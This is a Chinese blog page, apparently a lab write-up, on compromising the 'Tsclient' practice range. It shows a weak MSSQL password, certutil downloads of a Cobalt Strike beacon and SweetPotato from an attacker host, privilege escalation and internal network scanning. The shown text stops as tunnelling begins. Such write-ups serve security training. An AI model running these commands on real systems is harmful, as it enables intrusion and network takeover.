@@ -1,0 +1,370 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜-Tsclient | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="https:&#x2F;&#x2F;www.c1trus.top&#x2F;37-%E9%9D%B6%E6%9C%BAwp&#x2F;1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83&#x2F;%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF&#x2F;tsclient.html 开局一个ip 我们老样子，先扫常见端口 39.99.131.64 12345678910111213141516D:\red\">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Tsclient">
+<meta property="og:url" content="https://hundredsu.github.io/post/72d64c19.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="https:&#x2F;&#x2F;www.c1trus.top&#x2F;37-%E9%9D%B6%E6%9C%BAwp&#x2F;1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83&#x2F;%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF&#x2F;tsclient.html 开局一个ip 我们老样子，先扫常见端口 39.99.131.64 12345678910111213141516D:\red\">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-08-07T08:53:49.000Z">
+<meta property="article:modified_time" content="2025-08-07T17:49:39.751Z">
+<meta property="article:author" content="Hundredsu">
+<meta property="article:tag" content="靶机渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云镜-Tsclient",
+  "url": "https://hundredsu.github.io/post/72d64c19.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-08-07T08:53:49.000Z",
+  "dateModified": "2025-08-07T17:49:39.751Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/72d64c19.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜-Tsclient',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">春秋云镜-Tsclient</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜-Tsclient</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-07T08:53:49.000Z" title="发表于 2025-08-07 16:53:49">2025-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-07T17:49:39.751Z" title="更新于 2025-08-08 01:49:39">2025-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://www.c1trus.top/37-%E9%9D%B6%E6%9C%BAwp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/tsclient.html">https://www.c1trus.top/37-%E9%9D%B6%E6%9C%BAwp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/tsclient.html</a></p>
+<p>开局一个ip</p>
+<p>我们老样子，先扫常见端口</p>
+<p>39.99.131.64</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒<span class="number">6.0</span>免杀版\未免杀<span class="number">5</span>号黯区红队开发的fscan图形化和plus&gt;fscan.exe <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">131.64</span></span><br><span class="line"></span><br><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version: <span class="number">1.8</span>.<span class="number">4</span> TeamdArk5 v1.<span class="number">0</span></span><br><span class="line"><span class="built_in">start</span> infoscan</span><br><span class="line"><span class="number">39.99</span>.<span class="number">131.64</span>:<span class="number">1433</span> open</span><br><span class="line">[*] alive ports len is: <span class="number">1</span></span><br><span class="line"><span class="built_in">start</span> vulscan</span><br><span class="line">[+] mssql <span class="number">39.99</span>.<span class="number">131.64</span>:<span class="number">1433</span>:sa <span class="number">1</span>qaz!QAZ</span><br><span class="line">已完成 <span class="number">1</span>/<span class="number">1</span></span><br><span class="line">[*] 扫描结束,耗时: <span class="number">17.3737851</span>s</span><br></pre></td></tr></table></figure>
+
+<p>扫的有点不全，但是不影响我们getshell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">39.99</span>.<span class="number">131.64</span>                    mssql        弱口令 sa <span class="number">1</span>qaz!QAZ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/1.png"></p>
+<p>连接成功，接下来查看一下xp_cmpshell开没开</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/2.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/3.png"></p>
+<p>可以看到仅为mssqlserver权限</p>
+<p>上线cs</p>
+<p>先启动cs，再文件托管将a.exe上传到靶机</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/a.exe C:\Users\Public\a.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/4.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/5.png"></p>
+<p>成功上线</p>
+<p>信息收集一下</p>
+<p>直接看土豆家族是否能提权</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">11</span>] beacon&gt; shell whoami /priv</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">11</span>] [*] Tasked beacon to run: whoami /priv</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">17</span>] [+] host called home, sent: <span class="number">75</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">18</span>] [+] received output:</span><br><span class="line"></span><br><span class="line">特权信息</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">特权名                        描述                 状态  </span><br><span class="line">============================= ==================== ======</span><br><span class="line">SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用</span><br><span class="line">SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用</span><br><span class="line">SeChangeNotifyPrivilege       绕过遍历检查         已启用</span><br><span class="line">SeImpersonatePrivilege        身份验证后模拟客户端 已启用</span><br><span class="line">SeCreateGlobalPrivilege       创建全局对象         已启用</span><br><span class="line">SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>SeImpersonatePrivilege        身份验证后模拟客户端 已启用</p>
+<p>有这个权限</p>
+<p>上传SweetPotato进行提权</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/SweetPotato.exe C:\Users\Public\SweetPotato.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/6.png"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Users\Public\SweetPotato.exe <span class="literal">-a</span> C:\Users\Public\a.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/7.png"></p>
+<p>提权成功</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/8.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/9.png"></p>
+<p>接下来进行内网信息收集</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">54</span>] beacon&gt; shell ipconfig <span class="literal">-all</span></span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">54</span>] [*] Tasked beacon to run: ipconfig <span class="literal">-all</span></span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">54</span>] [+] host called home, sent: <span class="number">44</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">55</span>] [+] received output:</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line">   主机名  . . . . . . . . . . . . . : WIN<span class="literal">-WEB</span></span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : </span><br><span class="line">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter</span><br><span class="line">   物理地址. . . . . . . . . . . . . : <span class="number">00</span><span class="literal">-16-3E-28-AD-AF</span></span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 是</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">402</span>:<span class="number">1</span>e2a:<span class="number">6</span>e40:be5f%<span class="number">14</span>(首选) </span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">172.22</span>.<span class="number">8.18</span>(首选) </span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">0.0</span></span><br><span class="line">   获得租约的时间  . . . . . . . . . : <span class="number">2025</span>年<span class="number">5</span>月<span class="number">30</span>日 <span class="number">10</span>:<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">   租约过期的时间  . . . . . . . . . : <span class="number">2038</span>年<span class="number">1</span>月<span class="number">19</span>日 <span class="number">11</span>:<span class="number">14</span>:<span class="number">08</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : <span class="number">172.22</span>.<span class="number">255.253</span></span><br><span class="line">   DHCP 服务器 . . . . . . . . . . . : <span class="number">172.22</span>.<span class="number">255.253</span></span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . . : <span class="number">50337342</span></span><br><span class="line">   DHCPv6 客户端 DUID  . . . . . . . : <span class="number">00</span><span class="literal">-01-00-01-2F-CA-CB-58-00-16-3E-28-AD-AF</span></span><br><span class="line">   DNS 服务器  . . . . . . . . . . . : <span class="number">100.100</span>.<span class="number">2.136</span></span><br><span class="line">                                       <span class="number">100.100</span>.<span class="number">2.138</span></span><br><span class="line">   TCPIP 上的 NetBIOS  . . . . . . . : 已启用</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;E309DFD0<span class="literal">-37D7-4E89-A23A-3C61210B34EA</span>&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter</span><br><span class="line">   物理地址. . . . . . . . . . . . . : <span class="number">00</span><span class="literal">-00-00-00-00-00-00-E0</span></span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 否</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line"></span><br><span class="line">隧道适配器 Teredo Tunneling Pseudo<span class="literal">-Interface</span>:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Teredo Tunneling Pseudo<span class="literal">-Interface</span></span><br><span class="line">   物理地址. . . . . . . . . . . . . : <span class="number">00</span><span class="literal">-00-00-00-00-00-00-E0</span></span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 否</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line">   IPv6 地址 . . . . . . . . . . . . : <span class="number">2001</span>:<span class="number">0</span>:<span class="number">348</span>b:fb58:<span class="number">845</span>:<span class="number">161</span>:d89c:<span class="number">7</span>cbf(首选) </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">845</span>:<span class="number">161</span>:d89c:<span class="number">7</span>cbf%<span class="number">12</span>(首选) </span><br><span class="line">   默认网关. . . . . . . . . . . . . : ::</span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . . : <span class="number">134217728</span></span><br><span class="line">   DHCPv6 客户端 DUID  . . . . . . . : <span class="number">00</span><span class="literal">-01-00-01-2F-CA-CB-58-00-16-3E-28-AD-AF</span></span><br><span class="line">   TCPIP 上的 NetBIOS  . . . . . . . : 已禁用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>整理一下，看见了172.22.8.18&#x2F;24这个网段</p>
+<p>上传fscan进行探测</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/fscan.exe C:\Users\Public\fscan.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>防止防火墙禁止icmp协议</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell fscan.exe <span class="literal">-h</span> <span class="number">172.22</span>.<span class="number">8.18</span>/<span class="number">24</span> <span class="literal">-np</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">1433</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">88</span> open</span><br><span class="line">[*] WebTitle http://<span class="number">172.22</span>.<span class="number">8.18</span>        code:<span class="number">200</span> len:<span class="number">703</span>    title:IIS Windows Server</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.15</span></span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.15</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.18</span></span><br><span class="line">   [-&gt;]WIN<span class="literal">-WEB</span></span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.18</span></span><br><span class="line">   [-&gt;]<span class="number">2001</span>:<span class="number">0</span>:<span class="number">348</span>b:fb58:<span class="number">845</span>:<span class="number">161</span>:d89c:<span class="number">7</span>cbf</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.31</span></span><br><span class="line">   [-&gt;]WIN19<span class="literal">-CLIENT</span></span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.31</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.46</span></span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.46</span></span><br><span class="line">[*] NetBios <span class="number">172.22</span>.<span class="number">8.46</span>     WIN2016.xiaorang.lab                Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span></span><br><span class="line">[*] NetBios  <span class="number">172.22</span>.<span class="number">8.31</span>     XIAORANG\WIN19<span class="literal">-CLIENT</span>          Windows Version <span class="number">10.0</span> Build <span class="number">17763</span></span><br><span class="line">[*] NetBios  <span class="number">172.22</span>.<span class="number">8.15</span>     [+] DC:XIAORANG\DC01            Windows Version <span class="number">10.0</span> Build <span class="number">20348</span></span><br><span class="line">[*] WebTitle http://<span class="number">172.22</span>.<span class="number">8.46</span>        code:<span class="number">200</span> len:<span class="number">703</span>    title:IIS Windows Server</span><br><span class="line">[+] mssql <span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">1433</span>:sa <span class="number">1</span>qaz!QAZ</span><br><span class="line">[*] NetBios <span class="number">172.22</span>.<span class="number">8.18</span>     WIN<span class="literal">-WEB</span>              Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在扫的同时挂隧道代理</p>
